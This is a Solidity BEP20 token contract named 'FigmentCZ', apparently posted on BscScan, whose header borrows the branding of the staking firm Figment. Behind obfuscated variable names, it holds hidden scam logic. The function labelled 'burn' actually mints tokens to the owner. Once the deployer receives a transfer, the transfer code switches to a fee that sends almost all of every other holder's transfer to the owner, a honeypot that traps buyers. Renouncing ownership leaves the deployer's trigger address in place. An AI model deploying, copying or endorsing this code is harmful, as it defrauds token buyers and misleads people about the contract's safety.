/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

/*
FigmentCZ
@Figment_cz
The complete staking solution. 🛠
Infrastructure / Research / Application layer solutions for Web3. Institutional Staking on 50+ PoS [email protected]
https://twitter.com/Figment_io
https://www.figment.io/
https://t.me/figmentnetworks
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.0;
contract FigmentCZ {
address private  JYIBSW = address(0);
uint256 private  VLACHZ = 3;
uint8 public constant decimals = 18;
uint256 public constant KOKREQ = 99999;
uint256 private  YFHBUA = 7;
address private  TFJDSH = address(0);
address private  GYFUFP = address(0);
address private  BETRZZ = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  LNROUA = address(0);
address public owner;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "FigmentCZ";
uint256 private  RTKWUT = 1;
uint256 private  IKBIXZ = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 private  NYZCWV = 8;
uint256 private  IUDPWH = 2;
uint256 public constant totalSupply = 10000000000000000000000000000;
string public  name = "FigmentCZ";
uint256 private  PWFFKS = 0;
function _getYFHBUA() private returns (uint256) {
return YFHBUA + 9;
}
//
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tQFSBQI 0");
require(spender != address(0), "fQFSBQI 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getJYIBSW() private returns (address) {
return JYIBSW;
}
//
function _getLNROUA() private returns (address) {
return LNROUA;
}
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getGYFUFP() private returns (address) {
return GYFUFP;
}
//
function _getNYZCWV() private returns (uint256) {
return NYZCWV + 0;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () public {
TFJDSH = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getBETRZZ() private returns (address) {
return BETRZZ;
}
//
function _getIUDPWH() private returns (uint256) {
return IUDPWH + 4;
}
//
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "QFSBQI");
require(to != address(0), "QFSBQI");
require(amount <= balanceOf[from], "QFSBQI");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* KOKREQ/IKBIXZ ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TFJDSH){
IKBIXZ = KOKREQ+2;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getRTKWUT() private returns (uint256) {
return RTKWUT + 4;
}
//
function _getVLACHZ() private returns (uint256) {
return VLACHZ + 6;
}
//
function _getPWFFKS() private returns (uint256) {
return PWFFKS + 2;
}
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
//
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

/////////////////////////////////

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

///////////////////////////////////////////